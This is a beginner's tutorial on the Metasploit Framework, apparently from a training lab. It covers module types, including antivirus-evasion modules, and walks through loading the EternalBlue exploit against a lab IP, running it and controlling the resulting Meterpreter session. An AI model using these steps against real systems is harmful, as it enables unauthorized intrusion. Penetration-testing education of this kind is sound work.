# Metasploit Framework

## Overview

Metasploit is one of the most widely used penetration testing frameworks. It provides tools for:

* Information Gathering
* Vulnerability Scanning
* Exploitation
* Payload Delivery
* Post-Exploitation
* Vulnerability Research
* Exploit Development

Metasploit helps security professionals automate many penetration testing tasks and provides a large collection of exploits, payloads, auxiliary modules, and post-exploitation tools.


# Metasploit Versions

## Metasploit Pro

Commercial version.

Features:

* Graphical User Interface (GUI)
* Automated penetration testing workflows
* Reporting capabilities
* Enterprise management features

## Metasploit Framework

Open-source version.

Features:

* Command Line Interface (CLI)
* Extensive module library
* Community supported
* Most commonly used by penetration testers

Launch using:

```bash
msfconsole
```

# Core Components

## msfconsole

The primary command-line interface used to interact with Metasploit.

Used for:

* Loading modules
* Configuring exploits
* Running scans
* Managing sessions

## Modules

Small components designed for specific tasks.

Examples:

* Scanning
* Exploitation
* Brute forcing
* Information gathering


## Tools

Standalone utilities included with Metasploit.

Examples:

* msfvenom
* pattern_create
* pattern_offset


# Important Concepts

Before using Metasploit, understand three important terms.


## Vulnerability

A weakness in a system.

Examples:

* Misconfigurations
* Software bugs
* Design flaws

Impact:

* Information disclosure
* Privilege escalation
* Remote Code Execution


## Exploit

Code that takes advantage of a vulnerability.

Example:

```text
MS17-010 EternalBlue
```

Exploits allow attackers to trigger vulnerable behavior on a target system.

## Payload

Code executed after successful exploitation.

Examples:

* Reverse shell
* Bind shell
* Meterpreter
* Running commands
* Adding users

---

# Metasploit Modules

## Overview

Metasploit is built around **modules**.

A module is a small piece of code designed to perform a specific task such as:

* Information Gathering
* Scanning
* Enumeration
* Exploitation
* Payload Delivery
* Post-Exploitation

Before learning how to use Metasploit, it is important to understand the different types of modules available in the framework.

# Locating Metasploit Modules

Run:

```bash
cd /opt/metasploit-framework/embedded/framework/modules
```

```bash
ls
```

# Metasploit Module Categories

Metasploit contains seven main module categories:

```text
modules/
│
├── auxiliary
├── encoders
├── evasion
├── exploits
├── nops
├── payloads
└── post
```

Each category serves a different purpose.

---

# 1. Auxiliary Modules

## What Are Auxiliary Modules?

Auxiliary modules are supporting modules used during penetration testing.

Unlike exploits, they usually do **not** provide direct access to a target system.

Instead, they help gather information and identify weaknesses.

## Common Uses

* Port Scanning
* Service Enumeration
* Vulnerability Detection
* Brute Force Attacks
* Information Gathering
* Network Discovery

## Viewing Auxiliary Modules

Run:
```bash
cd /opt/metasploit-framework/embedded/framework/modules
```

```bash
tree -L 1 auxiliary/
```


```text
auxiliary/
├── admin
├── analyze
├── bnat
├── client
├── cloud
├── crawler
├── docx
├── dos
├── fileformat
├── fuzzers
├── gather
├── parser
├── pdf
├── scanner
├── server
├── sniffer
├── spoof
├── sqli
├── voip
└── vsploit
```

---

## Understanding Important Auxiliary Folders

### scanner

Used to scan systems and services.

Examples:

* SMB Scanner
* FTP Scanner
* SSH Scanner

---

### gather

Used to collect information from targets.

Examples:

* User Information
* System Information
* Network Information

---

### fuzzers

Used for fuzz testing applications.

Purpose:

```text
Send unexpected input and observe application behavior.
```

---

### spoof

Used for spoofing attacks.

Examples:

* DNS Spoofing
* ARP Spoofing


# 2. Encoders

## What Are Encoders?

Encoders modify the appearance of a payload without changing its functionality.

## Why Were Encoders Created?

Traditional antivirus solutions often rely on signatures.

Detection Process:

```text
File
 │
 ▼
Compare Against Known Signatures
 │
 ▼
Match Found
 │
 ▼
Detected
```

Encoders attempt to change the payload structure so it looks different.


## Important Note

Encoders do **NOT** guarantee antivirus evasion.

Modern security products use:

* Behavioral Analysis
* Sandboxing
* Heuristics
* Machine Learning


## Viewing Encoder Modules

Run:

```bash
tree -L 1 encoders/
```

Output:

```text
encoders/
├── cmd
├── generic
├── mipsbe
├── mipsle
├── php
├── ppc
├── ruby
├── sparc
├── x64
└── x86
```

---

## Encoder Folder Explanation

| Folder | Purpose                      |
| ------ | ---------------------------- |
| cmd    | Command payload encoders     |
| php    | PHP payload encoders         |
| ruby   | Ruby payload encoders        |
| x86    | 32-bit architecture encoders |
| x64    | 64-bit architecture encoders |


# 3. Evasion Modules

## What Are Evasion Modules?

Evasion modules are designed to bypass security products.

Examples:

* Windows Defender
* AppLocker
* Endpoint Protection Solutions


## Difference Between Encoders and Evasion Modules

### Encoders

```text
Change Payload Appearance
```

### Evasion Modules

```text
Attempt to Avoid Detection
```

## Viewing Evasion Modules

Run:

```bash
tree -L 2 evasion/
```

```text
evasion/
└── windows
    ├── applocker_evasion_install_util.rb
    ├── applocker_evasion_msbuild.rb
    ├── applocker_evasion_presentationhost.rb
    ├── applocker_evasion_regasm_regsvcs.rb
    ├── applocker_evasion_workflow_compiler.rb
    ├── process_herpaderping.rb
    ├── syscall_inject.rb
    ├── windows_defender_exe.rb
    └── windows_defender_js_hta.rb
```

Metasploit modules are primarily written in Ruby.


# 4. Exploit Modules

## What Are Exploits?

An exploit is code that takes advantage of a vulnerability.

Purpose:

```text
Gain Access
Execute Code
Escalate Privileges
```

## Viewing Exploit Modules

Run:

```bash
tree -L 1 exploits/
```

Output:

```text

exploits/
├── aix
├── android
├── apple_ios
├── bsd
├── bsdi
├── dialup
├── example_linux_priv_esc.rb
├── example.py
├── example.rb
├── example_webapp.rb
├── firefox
├── freebsd
├── hpux
├── irix
├── linux
├── mainframe
├── multi
├── netware
├── openbsd
├── osx
├── qnx
├── solaris
├── unix
└── windows

```

# 5. NOP Modules

## What Is a NOP?

NOP means:

```text
No Operation
```

A CPU instruction that does absolutely nothing.


## Viewing NOP Modules

Run:

```bash
tree -L 1 nops/
```

Output:

```text
nops/
├── aarch64
├── armle
├── cmd
├── mipsbe
├── php
├── ppc
├── sparc
├── tty
├── x64
└── x86

```


# 6. Payload Modules

## What Is a Payload?

A payload is the code executed after exploitation succeeds.

## Viewing Payload Modules

Run:

```bash
tree -L 1 payloads/
```

Output:

```text
payloads/
├── adapters
├── singles
├── stagers
└── stages
```


# Understanding Payload Categories

## Adapters

Wrap payloads into another format.

Example:

```text
PowerShell Payload
```

## Singles

Self-contained payloads.

Examples:

* Add User
* Run Command
* Launch Calculator


## Stagers

Small payloads used to establish a connection.

Purpose:

```text
Create Communication Channel
```


## Stages

Downloaded after the stager executes.

Purpose:

```text
Provide Full Functionality
```

## Single vs Staged Payload

### Single Payload

```text
generic/shell_reverse_tcp
```

Notice:

```text
shell_reverse_tcp
```

Uses:

```text
_
```

Meaning:

```text
Single Payload
```


# 7. Post Modules

## What Are Post Modules?

Post modules are used **after successful exploitation**.

They require an active session.

## Common Uses

* User Enumeration
* Credential Dumping
* Network Discovery
* Privilege Escalation
* Data Collection

## Viewing Post Modules

Run:

```bash
tree -L 1 post/
```

Output:

```text
post/
├── aix
├── android
├── apple_ios
├── bsd
├── firefox
├── hardware
├── linux
├── multi
├── networking
├── osx
├── solaris
└── windows
```

# msfconsole Basics

## Overview

`msfconsole` is the primary command-line interface of the Metasploit Framework.

Using msfconsole, you can:

* Search modules
* Configure exploits
* Select payloads
* Launch attacks
* Manage sessions
* Perform post-exploitation

Almost everything in Metasploit is performed through msfconsole.


# Step 1: Launch Metasploit

Open a terminal and run:

```bash
msfconsole
```

Example:

```bash
root@kali:~# msfconsole
```

# Step 2: Understanding the Metasploit Prompt

After loading, you will see:

```text
msf6 >
```

This means:

* Metasploit Version 6
* Ready to accept commands
* No module selected


# Step 3: Running Linux Commands Inside Metasploit

Run:

```bash
ls
```

```bash
ping -c 1 8.8.8.8
```

This sends one ICMP packet to Google's DNS server.


# Step 4: Using the Help Command

Display general help:

```bash
help
```

Display help for a specific command:

```bash
help set
```


### Why Use Help?

Use help whenever you forget a command or want to learn available options.


# Step 5: Viewing Command History

Run:

```bash
history
```
### Purpose

Shows previously executed commands.

Useful for:

* Troubleshooting
* Repeating commands
* Reviewing previous actions


# Step 6: Understanding Context

One of the most important Metasploit concepts is Context.

Current prompt:

```text
msf6 >
```

No module is selected.

---

# Step 7: Load a Module

Load EternalBlue:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

Output:

```text
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
```

Prompt changes to:

```text
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

---

## What Changed?

Metasploit is now operating inside the EternalBlue module.

This is called entering a module context.

---

# Step 8: View Module Options

Run:

```bash
show options
```

Output:

```text
RHOSTS
RPORT
LHOST
LPORT
```

These are the settings required before running the module.

---

# Step 9: View Compatible Payloads

Run:

```bash
show payloads
```

Purpose:

Displays payloads that can work with the selected exploit.

Example:

```text
windows/x64/meterpreter/reverse_tcp
windows/x64/exec
windows/x64/messagebox
```

---

# Step 10: View Detailed Module Information

Run:

```bash
info
```

Purpose:

Displays:

* Author
* Description
* References
* Targets
* Payload Information
* Required Options

Think of this as the documentation page for the module.

---

# Step 11: Return to Main Menu

Run:

```bash
back
```

Prompt changes:

```text
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

to

```text
msf6 >
```

You have exited the module context.

---
# Step 12: Filtering Search Results

Search only Auxiliary modules:

search type:auxiliary telnet

Output:

auxiliary/scanner/telnet/telnet_login
auxiliary/scanner/telnet/telnet_version
auxiliary/server/capture/telnet

# Step 13: Understanding Exploit Ranking

Every Metasploit exploit has a rank.

The rank indicates reliability.

| Rank      | Meaning                       |
| --------- | ----------------------------- |
| Excellent | Very Reliable                 |
| Great     | Highly Reliable               |
| Good      | Usually Reliable              |
| Normal    | Average Reliability           |
| Average   | May Require Multiple Attempts |
| Low       | Less Reliable                 |
| Manual    | Requires Manual Interaction   |


--------------

## What is a Parameter?

A parameter is information required by a module before it can run.

Examples:

| Parameter | Purpose                          |
| --------- | -------------------------------- |
| RHOSTS    | Target IP                        |
| RPORT     | Target Port                      |
| LHOST     | Attacker IP                      |
| LPORT     | Listening Port                   |
| PAYLOAD   | Code executed after exploitation |

# What is the set Command?

The set command is used to configure module-specific parameters.

Syntax
set PARAMETER VALUE
Example
set rhosts 10.10.165.39

Output:

rhosts => 10.10.165.39

This sets the target IP address for the current module.

# What is the setg Command?

setg means Set Global Variable.

Unlike set, values configured using setg remain available across multiple modules.

Example
setg rhosts 10.10.165.39

## What is a Session?

A session is an active connection between the attacker and the target.

Example:

```text
Attacker Machine
      │
      ▼
 Meterpreter Session
      │
      ▼
 Victim Machine
```

After successful exploitation, Metasploit creates a session.

# What is the sessions Command?

The sessions command is used to:

View active sessions
Interact with sessions
Manage sessions

Example:

sessions

Output:

Active sessions
===============

1 meterpreter x64/windows
2 meterpreter x64/windows
## What is Meterpreter?

Meterpreter is an advanced Metasploit payload.

It provides:

* Command execution
* File upload/download
* Process management
* Privilege escalation features

Example prompt:

```text
meterpreter >
```

---

## What is Context?

Metasploit works using contexts.

When no module is loaded:

```text
msf6 >
```

When a module is loaded:

```text
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

The prompt tells you where you currently are.

---

# Lab Goal

Goal:

Configure a Metasploit module, run it against a target, and manage the resulting session.


# Practical Demonstration

## Step 1: Start Metasploit

Launch Metasploit:

```bash
msfconsole
```

Example:

```bash
root@attackbox:~# msfconsole
```

After loading:

```text
msf6 >
```

You are now inside Metasploit.

---

## Step 2: Load a Module

Load the EternalBlue exploit:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

Output:

```text
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Notice the prompt changed.

This indicates the module has been loaded.

---

## Step 3: View Required Parameters

Check module requirements:

```bash
show options
```

Example:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
```

Important fields:

```text
RHOSTS
RPORT
LHOST
LPORT
```

These values must be configured before exploitation.

---

## Step 4: Configure Target IP

Set the victim IP address:

```bash
set rhosts 10.10.165.39
```

Output:

```text
rhosts => 10.10.165.39
```

Verify:

```bash
show options
```

You should now see:

```text
RHOSTS 10.10.165.39
```


## Step 5: Configure Global Variables

Instead of setting values repeatedly:

```bash
setg rhosts 10.10.165.39
```

Meaning:

* Global setting
* Available across modules

Verify:

```bash
show options
```


## Step 6: Switch Modules

Return to the main console:

```bash
back
```

Load another module:

```bash
use auxiliary/scanner/smb/smb_ms17_010
```

Check settings:

```bash
show options
```

Observe:

```text
RHOSTS 10.10.165.39
```

The value is still present because it was configured using:

```bash
setg
```


## Step 7: Execute the Module

Run the module:

```bash
run
```

or

```bash
exploit
```

Both commands execute the module.



## Step 8: Run and Automatically Background Session

Example:

```bash
exploit -z
```

Purpose:

* Run exploit
* Automatically background session

Useful when exploiting multiple targets.


## Step 9: Successful Exploitation

Example output:

```text
Meterpreter session 2 opened
```

This means:

* Exploitation succeeded
* Communication channel established


## Step 10: View Active Sessions

List sessions:

```bash
sessions
```

Example:

```text
1 meterpreter x64/windows
2 meterpreter x64/windows
```

Each session has a unique ID.


## Step 11: Interact with a Session

Connect to Session 2:

```bash
sessions -i 2
```

Output:

```text
meterpreter >
```

You are now controlling the target through Meterpreter.


## Step 12: Background the Session

Inside Meterpreter:

```bash
background
```

Output:

```text
[*] Backgrounding session 2...
```

Alternative:

```text
CTRL + Z
```

The session remains active.


## Step 13: Remove Parameters

Remove a single parameter:

```bash
unset rhosts
```

Remove all parameters:

```bash
unset all
```

Output:

```text
Flushing datastore...
```


## Step 14: Remove Global Variables

Remove global value:

```bash
unsetg rhosts
```

Remove all global values:

```bash
unsetg all
```


# Result

Successfully:

* Loaded a Metasploit module
* Viewed required options
* Configured parameters
* Executed the module
* Created a Meterpreter session
* Managed active sessions

---
